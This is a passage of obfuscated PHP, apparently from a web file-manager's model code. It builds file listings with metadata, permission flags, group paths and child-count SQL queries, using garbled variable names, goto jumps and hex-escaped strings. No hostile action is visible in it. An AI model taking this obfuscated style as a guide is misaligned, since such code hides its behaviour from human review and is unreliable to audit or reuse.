array($F±¢û◊“á·[28] => $F±¢û◊“á·[28], $F±¢û◊“á·[78] => $F±¢û◊“á·[78], $F±¢û◊“á·[157] => $F±¢û◊“á·[369], $F±¢û◊“á·[375] => $F±¢û◊“á·[375], $F±¢û◊“á·[402] => $F±¢û◊“á·[376], $F±¢û◊“á·[184] => $F±¢û◊“á·[184], $F±¢û◊“á·[108] => $F±¢û◊“á·[108]); $b‹ ãçª“Ù = Input::get($F±¢û◊“á·[403], $F±¢û◊“á·[7], $Cé™Æ∫®ùƒ, array_keys($e”§ç¥°À˜)); goto EΩ∏°Ω„ñ™; aÚÎ–±Ç≈: $F±¢û◊“á· =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cé™Æ∫®ùƒ = Model($F±¢û◊“á·[395])->get($F±¢û◊“á·[396]); $eÒâÈ’‹•≈ = Model($F±¢û◊“á·[395])->get($F±¢û◊“á·[397]); goto AË…»÷‘Ëã; E∞ï≥‡ï…ø: if ($b‹ ãçª“Ù == $F±¢û◊“á·[28]) { } $aÈ∂∞◊ãÛœ = $F±¢û◊“á·[405] . $e”§ç¥°À˜[$b‹ ãçª“Ù] . $F±¢û◊“á·[50] . $aÔ™ªƒç…≠[$eäƒ≈•¡‘µ]; return $this->order(rtrim(trim($aÈ∂∞◊ãÛœ), $F±¢û◊“á·[47])); goto EÂÑ—ﬂñ…◊; EΩ∏°Ω„ñ™: $eäƒ≈•¡‘µ = Input::get($F±¢û◊“á·[404], $F±¢û◊“á·[7], $eÒâÈ’‹•≈, array_keys($aÔ™ªƒç…≠)); if (!in_array($b‹ ãçª“Ù, array_keys($e”§ç¥°À˜))) { $b‹ ãçª“Ù = $F±¢û◊“á·[28]; } if (!in_array($eäƒ≈•¡‘µ, array_keys($aÔ™ªƒç…≠))) { $b‹ ãçª“Ù = $F±¢û◊“á·[398]; } goto E∞ï≥‡ï…ø; EÂÑ—ﬂñ…◊: } protected function _listDataApplyItem($e¶ÔÉÊ°ì», $céÆºÏê–ê = false) { $AÓ™®√÷•å = array($e¶ÔÉÊ°ì»); $this->_listDataApply($AÓ™®√÷•å, $céÆºÏê–ê); return $AÓ™®√÷•å[0]; } protected function _listDataApply(&$DΩä“§•ß, $D‚∂æîˆùø = false) { goto d ÚøÉƒ‚ç; d ÚøÉƒ‚ç: $FÜòÛÛ∫πﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$DΩä“§•ß) { $DΩä“§•ß = array(); return; } $b¡◊Œ∑∞—Ù = array_to_keyvalue($DΩä“§•ß, $FÜòÛÛ∫πﬁ[33], $FÜòÛÛ∫πﬁ[366]); goto E≈’É¥éåÍ; c™¨∂ÿ›®ı: $this->_listAppendUser($DΩä“§•ß); $this->_listFilterInfo($DΩä“§•ß, $D‚∂æîˆùø); goto f–ú£ˆ˜õ‰; C˘∑·ùûûî: $this->_listAppendPath($DΩä“§•ß); $this->_listAppendAuth($DΩä“§•ß); $this->_listAppendSourceInfo($DΩä“§•ß, $b¡◊Œ∑∞—Ù); goto c™¨∂ÿ›®ı; E≈’É¥éåÍ: $b¡◊Œ∑∞—Ù = array_unique($b¡◊Œ∑∞—Ù); $this->_listSourceCache($DΩä“§•ß); if (!$D‚∂æîˆùø) { $this->_listAppendMeta($DΩä“§•ß, $b¡◊Œ∑∞—Ù); $this->_listAppendFileMeta($DΩä“§•ß, $b¡◊Œ∑∞—Ù); $this->_listAppendChildren($DΩä“§•ß, $b¡◊Œ∑∞—Ù); } goto C˘∑·ùûûî; f–ú£ˆ˜õ‰: } protected function _listSourceCache($eÀ≥ÙÌî—µ) { $añé™¿∑≤Ö =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($eÀ≥ÙÌî—µ as $fﬂŸ´´–Ë†) { self::$cacheSourceInfo[$añé™¿∑≤Ö[406] . $fﬂŸ´´–Ë†[$añé™¿∑≤Ö[366]]] = $fﬂŸ´´–Ë†; } } protected function _listFilterInfo(&$D†ààçø§‰, $dß‰âÿÑé» = false) { $AÉ°»›Øç„ =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($D†ààçø§‰ as &$c¬§¨à§Œú) { $c¬§¨à§Œú = $this->pathInfoFilter($c¬§¨à§Œú); self::$cachePathInfo[$AÉ°»›Øç„[407] . intval($dß‰âÿÑé») . $AÉ°»›Øç„[408] . $c¬§¨à§Œú[$AÉ°»›Øç„[366]]] = $c¬§¨à§Œú; } } protected function _listMake(&$A¬Ñ¢ÿñôä) { $cø‘û”©ß¥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A¬Ñ¢ÿñôä[$cø‘û”©ß¥[75]] = array(); $A¬Ñ¢ÿñôä[$cø‘û”©ß¥[74]] = array(); foreach ($A¬Ñ¢ÿñôä[$cø‘û”©ß¥[350]] as $EÉßÚúüìπ) { $F¨ˆ±¿—ø´ = $EÉßÚúüìπ[$cø‘û”©ß¥[367]] == 1 ? $cø‘û”©ß¥[75] : $cø‘û”©ß¥[74]; $A¬Ñ¢ÿñôä[$F¨ˆ±¿—ø´][] = $EÉßÚúüìπ; } unset($A¬Ñ¢ÿñôä[$cø‘û”©ß¥[350]]); } protected function _listAppendMeta(&$A“⁄è”ô¢É, $f∫Ò˘ÊìãØ) { goto a–Øû·äÂä; d·„œ‘ÇÊ: foreach ($bﬁÓƒÍ•Áç as $Eàé·ıúãÌ) { if (!isset($EëÑﬂ◊ï¿ú[$Eàé·ıúãÌ[$dôõ†¨˘´Î[366]]])) { $EëÑﬂ◊ï¿ú[$Eàé·ıúãÌ[$dôõ†¨˘´Î[366]]] = array(); } if (in_array($Eàé·ıúãÌ[$dôõ†¨˘´Î[90]], $Dﬁ∏ÕâÑﬂ )) { continue; } $EëÑﬂ◊ï¿ú[$Eàé·ıúãÌ[$dôõ†¨˘´Î[366]]][$Eàé·ıúãÌ[$dôõ†¨˘´Î[90]]] = $Eàé·ıúãÌ[$dôõ†¨˘´Î[354]]; } foreach ($A“⁄è”ô¢É as &$cΩ±Ûúè†‘) { $cΩ±Ûúè†‘[$dôõ†¨˘´Î[413]] = !1; if (isset($EëÑﬂ◊ï¿ú[$cΩ±Ûúè†‘[$dôõ†¨˘´Î[366]]])) { $cΩ±Ûúè†‘[$dôõ†¨˘´Î[413]] = $EëÑﬂ◊ï¿ú[$cΩ±Ûúè†‘[$dôõ†¨˘´Î[366]]]; } if ($this->fileIsLock($cΩ±Ûúè†‘) && $cΩ±Ûúè†‘[$dôõ†¨˘´Î[373]]) { $b∑Øèô”Ñê = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $cΩ±Ûúè†‘[$dôõ†¨˘´Î[373]][$dôõ†¨˘´Î[374]] = AuthModel::authDisable($cΩ±Ûúè†‘[$dôõ†¨˘´Î[373]][$dôõ†¨˘´Î[374]], $b∑Øèô”Ñê); $cΩ±Ûúè†‘[$dôõ†¨˘´Î[373]][$dôõ†¨˘´Î[414]][$dôõ†¨˘´Î[373]] = $cΩ±Ûúè†‘[$dôõ†¨˘´Î[373]][$dôõ†¨˘´Î[374]]; } } goto fƒê¯ŒÚûÍ; a–Øû·äÂä: $dôõ†¨˘´Î =& $_SERVER[£¿ÌÙëü¡¯¯]; $e˘òâë ÷Â = array($dôõ†¨˘´Î[380] => array($dôõ†¨˘´Î[381], $f∫Ò˘ÊìãØ)); $bﬁÓƒÍ•Áç = Model($dôõ†¨˘´Î[409])->field($dôõ†¨˘´Î[410])->where($e˘òâë ÷Â)->select(); goto f¥°∂Üﬁ„ñ; f¥°∂Üﬁ„ñ: if (!$bﬁÓƒÍ•Áç) { return; } $Dﬁ∏ÕâÑﬂ  = array($dôõ†¨˘´Î[411], $dôõ†¨˘´Î[412]); $EëÑﬂ◊ï¿ú = array(); goto d·„œ‘ÇÊ; fƒê¯ŒÚûÍ: } protected function _listAppendFileMeta(&$f¢°®ûè¬Í, $c¶’¶Õ∏ÈÀ) { goto FÉ¨⁄î⁄êô; FÉ¨⁄î⁄êô: $FüëË¨„ùÉ =& $_SERVER[£¿ÌÙëü¡¯¯]; $CØâÉÇòÍ” = array_to_keyvalue($f¢°®ûè¬Í, $FüëË¨„ùÉ[33], $FüëË¨„ùÉ[415]); $CØâÉÇòÍ” = array_filter(array_unique($CØâÉÇòÍ”)); goto AáÁ¢”´‚æ; AáÁ¢”´‚æ: if (!$CØâÉÇòÍ”) { return; } $f„ì£§¯‚∆ = array($FüëË¨„ùÉ[416] => array($FüëË¨„ùÉ[381], $CØâÉÇòÍ”)); $B‡◊¨çÊ“≈ = $FüëË¨„ùÉ[417]; goto a≥§¨Èºûø; a≥§¨Èºûø: $f∂”™÷åö≠ = Model($FüëË¨„ùÉ[418])->field($B‡◊¨çÊ“≈)->where($f„ì£§¯‚∆)->select(); $f∂”™÷åö≠ = array_to_keyvalue($f∂”™÷åö≠, $FüëË¨„ùÉ[415]); $A–¯™ãﬂ‚Ø = Model($FüëË¨„ùÉ[419])->field($FüëË¨„ùÉ[420])->where($f„ì£§¯‚∆)->select(); goto eÇªíÌã‘´; a”∏éÔ‚Óç: foreach ($f¢°®ûè¬Í as &$B‹¨˘ã≈¢õ) { goto B¨Ÿ€¿û≤∑; d‹ã£†òèé: if (isset($B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[159]][$FüëË¨„ùÉ[422]])) { $B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[422]] = json_decode($B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[159]][$FüëË¨„ùÉ[422]], !0); unset($B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[159]][$FüëË¨„ùÉ[422]]); } goto f…≈ÖÙ∂‹ê; B¨Ÿ€¿û≤∑: $e©ë‹ù¶±‚ = $B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[415]]; if (!$e©ë‹ù¶±‚ || !isset($f∂”™÷åö≠[$e©ë‹ù¶±‚])) { continue; } $c´Â’ô∂√Ù = $f∂”™÷åö≠[$e©ë‹ù¶±‚]; goto a≈Éûêå€ˆ; a≈Éûêå€ˆ: $c´Â’ô∂√Ù[$FüëË¨„ùÉ[78]] = $B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[78]]; $c´Â’ô∂√Ù[$FüëË¨„ùÉ[28]] = $B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[28]]; self::$cacheFileInfo[$FüëË¨„ùÉ[421] . $e©ë‹ù¶±‚] = $c´Â’ô∂√Ù; goto Fª…´∑‚Ÿõ; Fª…´∑‚Ÿõ: unset($f∂”™÷åö≠[$e©ë‹ù¶±‚][$FüëË¨„ùÉ[76]]); $B‘Ï‹Ó¥Ìæ = is_array($d‰èçÓ¡áµ[$e©ë‹ù¶±‚]) ? $d‰èçÓ¡áµ[$e©ë‹ù¶±‚] : array(); $B‹¨˘ã≈¢õ[$FüëË¨„ùÉ[159]] = array_merge($B‘Ï‹Ó¥Ìæ, $f∂”™÷åö≠[$e©ë‹ù¶±‚]); goto d‹ã£†òèé; f…≈ÖÙ∂‹ê: } goto BÕ÷Ñ¢ê¿ß; eÇªíÌã‘´: $A–¯™ãﬂ‚Ø = $A–¯™ãﬂ‚Ø ? $A–¯™ãﬂ‚Ø : array(); $d‰èçÓ¡áµ = array(); foreach ($A–¯™ãﬂ‚Ø as $DƒüÂ¥°⁄≤) { if (!isset($d‰èçÓ¡áµ[$DƒüÂ¥°⁄≤[$FüëË¨„ùÉ[415]]])) { $d‰èçÓ¡áµ[$DƒüÂ¥°⁄≤[$FüëË¨„ùÉ[415]]] = array(); } $d‰èçÓ¡áµ[$DƒüÂ¥°⁄≤[$FüëË¨„ùÉ[415]]][$DƒüÂ¥°⁄≤[$FüëË¨„ùÉ[90]]] = $DƒüÂ¥°⁄≤[$FüëË¨„ùÉ[354]]; } goto a”∏éÔ‚Óç; BÕ÷Ñ¢ê¿ß: } protected function _listAppendSourceInfo(&$Bú›äﬂœüã, $Eåﬁä‡üÁ´) { goto Fí“∆Öœ‹˘; eï¢¥˘‘‚ß: $DŸ¥ä≠íí— = Model($d¶◊™√¨áæ[389])->listData(); $f®°ä»‡®÷ = Model($d¶◊™√¨áæ[378])->listData(); $Eñ›¯¥Ô•‹ = Model($d¶◊™√¨áæ[425])->listSimple(); goto f™æé’ªÖ≈; A÷∏““ƒ∫æ: $FÜê∂ø‚∂Í = array_to_keyvalue_group($Eñ›¯¥Ô•‹, $d¶◊™√¨áæ[366]); foreach ($Bú›äﬂœüã as &$aÖô§ﬁØ·Ø) { $aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[388]] = array($d¶◊™√¨áæ[426] => 0, $d¶◊™√¨áæ[427] => 0, $d¶◊™√¨áæ[428] => 0); if (isset($c√¨•ë—◊±[$aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[366]]])) { $aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[388]][$d¶◊™√¨áæ[429]] = 1; $aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[388]][$d¶◊™√¨áæ[430]] = $c√¨•ë—◊±[$aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[366]]][$d¶◊™√¨áæ[28]]; } if (isset($dòôﬂ”åôﬁ[$aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[366]]])) { $aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[388]][$d¶◊™√¨áæ[431]] = array(); foreach ($dòôﬂ”åôﬁ[$aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[366]]] as $Fé∞∂Ïá›–) { $AÍèøêïÜ¡ = $DÓïŒæˆóê[$Fé∞∂Ïá›–]; $aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[388]][$d¶◊™√¨áæ[431]][] = array($d¶◊™√¨áæ[432] => $AÍèøêïÜ¡[$d¶◊™√¨áæ[364]], $d¶◊™√¨áæ[383] => $AÍèøêïÜ¡[$d¶◊™√¨áæ[28]], $d¶◊™√¨áæ[433] => $AÍèøêïÜ¡[$d¶◊™√¨áæ[434]]); } } if (isset($FÜê∂ø‚∂Í[$aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[366]]])) { $aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[388]][$d¶◊™√¨áæ[435]] = array(); foreach ($FÜê∂ø‚∂Í[$aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[366]]] as $bŸÜœŸˆ∑ü) { $aÖô§ﬁØ·Ø[$d¶◊™√¨áæ[388]][$d¶◊™√¨áæ[435]] = array($d¶◊™√¨áæ[436] => $bŸÜœŸˆ∑ü[$d¶◊™√¨áæ[437]], $d¶◊™√¨áæ[438] => $bŸÜœŸˆ∑ü[$d¶◊™√¨áæ[439]], $d¶◊™√¨áæ[440] => $bŸÜœŸˆ∑ü[$d¶◊™√¨áæ[366]], $d¶◊™√¨áæ[441] => $bŸÜœŸˆ∑ü[$d¶◊™√¨áæ[442]], $d¶◊™√¨áæ[443] => $bŸÜœŸˆ∑ü[$d¶◊™√¨áæ[444]]); } } } return $Bú›äﬂœüã; goto b¿ÂŒßºˆ˜; Fí“∆Öœ‹˘: $d¶◊™√¨áæ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!defined($d¶◊™√¨áæ[423])) { return; } $F„–¡∫Û≠• = Model($d¶◊™√¨áæ[424])->listData(); goto eï¢¥˘‘‚ß; f™æé’ªÖ≈: $DÓïŒæˆóê = array_to_keyvalue($F„–¡∫Û≠•, $d¶◊™√¨áæ[364]); $dòôﬂ”åôﬁ = array_to_keyvalue_group($DŸ¥ä≠íí—, $d¶◊™√¨áæ[76], $d¶◊™√¨áæ[390]); $c√¨•ë—◊± = array_to_keyvalue($f®°ä»‡®÷, $d¶◊™√¨áæ[76]); goto A÷∏““ƒ∫æ; b¿ÂŒßºˆ˜: } protected function _listAppendChildren(&$BúºÒØÜí÷, $cŸÆ›ß°ã¡) { goto Aﬂ†éø Ü∏; dõµñì√¬”: for ($eùª¨ÑÈ—ú = 0; $eùª¨ÑÈ—ú < $C‰¶¥ÿ “ü; $eùª¨ÑÈ—ú++) { if ($BúºÒØÜí÷[$eùª¨ÑÈ—ú][$B∂ÕÌ’≠º‚[367]]) { $fä„ÚÑ¬ï€ = $BúºÒØÜí÷[$eùª¨ÑÈ—ú][$B∂ÕÌ’≠º‚[366]]; $eÒè√∞ù Ø .= "\x53\x45\x4c\105\103\x54\40\x2a\x20\x46\x52\117\x4d\40\x28\123\105\114\x45\103\124\40\x27{$fä„ÚÑ¬ï€}\x5f\150\x61\x73\x46\151\154\x65\47\40\x61\x73\x20\150\141\163\54\x63\157\x75\156\164\50\x31\x29\x20\141\x73\40\150\x61\163\103\x6f\165\156\x74\x20\106\x52\x4f\x4d\x20\140{$dœ’±∞äÖ‹}\140\x20\12\11\x9\11\11\x9\x77\150\x65\162\145\40\x70\141\x72\145\156\x74\111\x44\x3d{$fä„ÚÑ¬ï€}\40\x61\x6e\x64\40\151\163\106\157\154\x64\145\162\x3d\x30\x20\141\156\144\40\x69\163\104\x65\x6c\145\164\145\x3d\60\51\x20\x61\x73\40\x74\x62\61\x5f{$fä„ÚÑ¬ï€}\x20\165\x6e\x69\157\156\40\141\x6c\154\40\12\11\11\11\x9\x9\123\x45\x4c\105\103\124\x20\52\40\106\122\x4f\115\x20\x28\x53\105\114\x45\103\x54\x20\47{$fä„ÚÑ¬ï€}\x5f\x68\141\163\x46\x6f\x6c\x64\145\162\47\40\x61\x73\40\x68\x61\163\106\x69\x6c\x65\x2c\143\157\x75\x6e\164\x28\x31\51\40\141\x73\x20\150\x61\x73\x43\x6f\165\x6e\x74\40\106\x52\x4f\115\x20\140{$dœ’±∞äÖ‹}\x60\40\12\x9\x9\11\x9\x9\x77\150\145\162\x65\x20\x70\141\162\x65\156\x74\x49\104\x3d{$fä„ÚÑ¬ï€}\40\x61\x6e\144\40\151\x73\106\157\154\144\x65\x72\75\61\40\x61\156\x64\40\151\x73\x44\145\154\x65\x74\145\x3d\x30\51\x20\141\163\40\164\x62\62\x5f{$fä„ÚÑ¬ï€}\40\x75\x6e\151\157\x6e\x20\141\154\154\x20"; } if ((strlen($eÒè√∞ù Ø) >= $DÌ£è¿Ü≠È || $eùª¨ÑÈ—ú == $C‰¶¥ÿ “ü - 1) && $eÒè√∞ù Ø) { $eÒè√∞ù Ø = substr($eÒè√∞ù Ø, 0, -strlen($B∂ÕÌ’≠º‚[445])); $CˆòÜæí¬è = $this->query($eÒè√∞ù Ø); $c® éÖàìŸ = array_merge($c® éÖàìŸ, $CˆòÜæí¬è); $eÒè√∞ù Ø = $B∂ÕÌ’≠º‚[33]; } } $c® éÖàìŸ = array_to_keyvalue($c® éÖàìŸ, $B∂ÕÌ’≠º‚[446]); foreach ($BúºÒØÜí÷ as &$fŒ—ÌõÎ‹¡) { if ($fŒ—ÌõÎ‹¡[$B∂ÕÌ’≠º‚[367]]) { unset($fŒ—ÌõÎ‹¡[$B∂ÕÌ’≠º‚[369]]); $fŒ—ÌõÎ‹¡[$B∂ÕÌ’≠º‚[189]] = intval($c® éÖàìŸ[$fŒ—ÌõÎ‹¡[$B∂ÕÌ’≠º‚[366]] . $B∂ÕÌ’≠º‚[447]][$B∂ÕÌ’≠º‚[448]]); $fŒ—ÌõÎ‹¡[$B∂ÕÌ’≠º‚[188]] = intval($c® éÖàìŸ[$fŒ—ÌõÎ‹¡[$B∂ÕÌ’≠º‚[366]] . $B∂ÕÌ’≠º‚[449]][$B∂ÕÌ’≠º‚[448]]); } } goto E◊êÒ‡È…™; Fñ•ﬂªÇ€‹: $DÌ£è¿Ü≠È = 1024 * 50; $C‰¶¥ÿ “ü = count($BúºÒØÜí÷); $dœ’±∞äÖ‹ = $this->tablePrefix . $this->tableName; goto dõµñì√¬”; Aﬂ†éø Ü∏: $B∂ÕÌ’≠º‚ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÒè√∞ù Ø = $B∂ÕÌ’≠º‚[358]; $c® éÖàìŸ = array(); goto Fñ•ﬂªÇ€‹; E◊êÒ‡È…™: } protected function _listAppendAuth(&$Eì≠‚ÿ…∫’) { goto d≥‰¶ˆ‡ÑÔ; eÖå¥”õÖ‚: foreach ($Eì≠‚ÿ…∫’ as $EÙ≥‚“”Èª) { if ($EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[368]] == self::TYPE_GROUP) { $fæä”‡ñãÆ[] = $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[366]]; } } if (!$fæä”‡ñãÆ) { return; } $Eë∂äÓ˘Òù = array_to_keyvalue($Eì≠‚ÿ…∫’, $d∆‰∆ç”ÛÓ[366]); goto DæÕÚπ∫Ô≥; DæÕÚπ∫Ô≥: $eœà˜Ü·ÌÂ = Model($d∆‰∆ç”ÛÓ[450])->getSourceList($fæä”‡ñãÆ, $Eë∂äÓ˘Òù); foreach ($Eì≠‚ÿ…∫’ as $CéÀÁüÿ’Ù => &$EÙ≥‚“”Èª) { $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[373]] = $eœà˜Ü·ÌÂ[$EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[366]]]; if (!$EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[373]] && $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[368]] == self::TYPE_GROUP) { $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[373]] = Action($d∆‰∆ç”ÛÓ[451])->pathGroupAuthMake($EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[452]]); if (!$EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[373]] && !_get($GLOBALS, $d∆‰∆ç”ÛÓ[453])) { $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[186]] = !1; $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[185]] = !1; } } if ($EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[373]]) { $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[186]] = AuthModel::authCheckEdit($EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[373]][$d∆‰∆ç”ÛÓ[374]]); $EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[185]] = AuthModel::authCheckView($EÙ≥‚“”Èª[$d∆‰∆ç”ÛÓ[373]][$d∆‰∆ç”ÛÓ[374]]); } $this->groupPathDisplay($EÙ≥‚“”Èª); } goto Fü≤õ≤çÜ’; d≥‰¶ˆ‡ÑÔ: $d∆‰∆ç”ÛÓ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!defined($d∆‰∆ç”ÛÓ[423])) { return; } $fæä”‡ñãÆ = array(); goto eÖå¥”õÖ‚; Fü≤õ≤çÜ’: } public function groupPathDisplay(&$Cùßä∂π∆Í) { goto CÁÚû∫Ω—Ì; d‹ıºûµâ: $Cùßä∂π∆Í[$Fæ∫ìÉûﬁπ[460]] = $C√Æî¶µΩÊ . $Aá’É˜√Ïå[$Fæ∫ìÉûﬁπ[388]][$Fæ∫ìÉûﬁπ[366]]; goto A…ªùÏñ©›; BÇ—áè©âÉ: $e¯‹êëﬁÒ« = $this->parentLevelArray($Aá’É˜√Ïå[$Fæ∫ìÉûﬁπ[455]]); $C√Æî¶µΩÊ = $Fæ∫ìÉûﬁπ[33]; foreach ($e¯‹êëﬁÒ« as $B⁄°±ç…Âä) { $DÎ¿øı‹€ï = Model($Fæ∫ìÉûﬁπ[454])->getInfo($B⁄°±ç…Âä); $C√Æî¶µΩÊ .= $DÎ¿øı‹€ï[$Fæ∫ìÉûﬁπ[388]][$Fæ∫ìÉûﬁπ[366]] . $Fæ∫ìÉûﬁπ[47]; } goto e°¿éÃéòÆ; CÁÚû∫Ω—Ì: $Fæ∫ìÉûﬁπ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($Cùßä∂π∆Í[$Fæ∫ìÉûﬁπ[368]] != self::TYPE_GROUP) { return; } $Aá’É˜√Ïå = Model($Fæ∫ìÉûﬁπ[454])->getInfo($Cùßä∂π∆Í[$Fæ∫ìÉûﬁπ[452]]); goto BÇ—áè©âÉ; e°¿éÃéòÆ: $Cùßä∂π∆Í[$Fæ∫ìÉûﬁπ[456]] = $Aá’É˜√Ïå[$Fæ∫ìÉûﬁπ[457]]; $Cùßä∂π∆Í[$Fæ∫ìÉûﬁπ[377]] = $Aá’É˜√Ïå[$Fæ∫ìÉûﬁπ[455]]; $Cùßä∂π∆Í[$Fæ∫ìÉûﬁπ[458]] = $Aá’É˜√Ïå[$Fæ∫ìÉûﬁπ[459]]; goto d‹ıºûµâ; A…ªùÏñ©›: } protected function _listAppendPath(&$d ”‡úò≤Œ) { goto bÇ€›±∂¢Ï; D ìÔÃÇÓª: $c ∏‰äÖ‚„ = array(); foreach ($D‚‡ÿ»Ç©Æ as $eÎÉ≤æàÀï => $BÉ¡æÙ—Éµ) { if (!$BÉ¡æÙ—Éµ) { $c ∏‰äÖ‚„[] = $eÎÉ≤æàÀï; } } if ($c ∏‰äÖ‚„) { $d¨â®Î≈µ´ = array($bÕâ∏˜ë¢¨[380] => array($bÕâ∏˜ë¢¨[381], $c ∏‰äÖ‚„)); if (count($c ∏‰äÖ‚„) == 1) { $dçèú∆‚‰É = $this->sourceInfo($c ∏‰äÖ‚„[0]); $dçèú∆‚‰É = is_array($dçèú∆‚‰É) ? array($dçèú∆‚‰É) : !1; } else { $dçèú∆‚‰É = $this->field($bÕâ∏˜ë¢¨[461])->where($d¨â®Î≈µ´)->select(); } $cﬁ¡©õèÃÔ = array_to_keyvalue($dçèú∆‚‰É, $bÕâ∏˜ë¢¨[366], $bÕâ∏˜ë¢¨[28]); $D‚‡ÿ»Ç©Æ = array_merge_index($D‚‡ÿ»Ç©Æ, $cﬁ¡©õèÃÔ); } goto F¬ûÃÏòÖè; bÇ€›±∂¢Ï: $bÕâ∏˜ë¢¨ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D‚‡ÿ»Ç©Æ = array(); foreach ($d ”‡úò≤Œ as &$B√áûΩîÃÑ) { $D‚‡ÿ»Ç©Æ[$B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[366]]] = $B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[28]]; $eÓ¿ØñÀ’ = $this->parentLevelArray($B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[455]]); array_shift($eÓ¿ØñÀ’); foreach ($eÓ¿ØñÀ’ as $cùæíá·éº) { if (!isset($D‚‡ÿ»Ç©Æ[$cùæíá·éº])) { $D‚‡ÿ»Ç©Æ[$cùæíá·éº] = 0; } } } goto D ìÔÃÇÓª; F¬ûÃÏòÖè: foreach ($d ”‡úò≤Œ as &$B√áûΩîÃÑ) { goto dáàáŒ„ß; B†™ËÂ’Æ◊: $e‡ÂíØ¯û≤ = trim($B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[462]], $bÕâ∏˜ë¢¨[8]); if ($B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[457]] == $bÕâ∏˜ë¢¨[464] && $e‡ÂíØ¯û≤) { $B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[28]] = $e‡ÂíØ¯û≤; } goto BÜ·Ì±èô≠; cÇ√“ÂáÙê: if ($eÓ¿ØñÀ’) { $A‡ä€éÁÖ® .= $B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[28]]; } if ($B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[367]]) { $A‡ä€éÁÖ® .= $bÕâ∏˜ë¢¨[8]; } $B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[462]] = str_replace($bÕâ∏˜ë¢¨[463], $bÕâ∏˜ë¢¨[8], $A‡ä€éÁÖ®); goto B†™ËÂ’Æ◊; dáàáŒ„ß: $eÓ¿ØñÀ’ = $this->parentLevelArray($B√áûΩîÃÑ[$bÕâ∏˜ë¢¨[455]]); $A‡ä€éÁÖ® = $this->_listAppendPathRoot($B√áûΩîÃÑ, $eÓ¿ØñÀ’); foreach ($eÓ¿ØñÀ’ as $cùæíá·éº) { if (isset($D‚‡ÿ»Ç©Æ[$cùæíá·éº])) { $A‡ä€éÁÖ® .= $D‚‡ÿ»Ç©Æ[$cùæíá·éº] . $bÕâ∏˜ë¢¨[8]; } } goto cÇ√“ÂáÙê; BÜ·Ì±èô≠: } goto D◊¥ç‰ÖÙº; D◊¥ç‰ÖÙº: } protected function _listAppendPathRoot(&$Bø∞ùÒƒÊ÷, $a∏ëúè´∫õ) { $Bƒáôî§®Ω =& $_SERVER[£¿ÌÙëü¡¯¯]; $dœäªÓ¨ı∫ = $Bƒáôî§®Ω[33]; if ($Bø∞ùÒƒÊ÷[$Bƒáôî§®Ω[368]] == self::TYPE_USER) { if (defined($Bƒáôî§®Ω[423]) && $Bø∞ùÒƒÊ÷[$Bƒáôî§®Ω[452]] == USER_ID) { $dœäªÓ¨ı∫ = LNG($Bƒáôî§®Ω[465]); if (!$a∏ëúè´∫õ) { $Bø∞ùÒƒÊ÷[$Bƒáôî§®Ω[28]] = $dœäªÓ¨ı∫; } } else { $BôåªØô‰‹ = Model($Bƒáôî§®Ω[466])->getInfoSimple($Bø∞ùÒƒÊ÷[$Bƒáôî§®Ω[452]]); $dœäªÓ¨ı∫ = LNG($Bƒáôî§®Ω[467]) . $Bƒáôî§®Ω[154] . $BôåªØô‰‹[$Bƒáôî§®Ω[28]] . $Bƒáôî§®Ω[468]; } } else { if ($Bø∞ùÒƒÊ÷[$Bƒáôî§®Ω[368]] == self::TYPE_GROUP) { $BôåªØô‰‹ = Model($Bƒáôî§®Ω[454])->getInfoSimple($Bø∞ùÒƒÊ÷[$Bƒáôî§®Ω[452]]); $dœäªÓ¨ı∫ = $BôåªØô‰‹[$Bƒáôî§®Ω[28]]; } else { if ($Bø∞ùÒƒÊ÷[$Bƒáôî§®Ω[368]] == 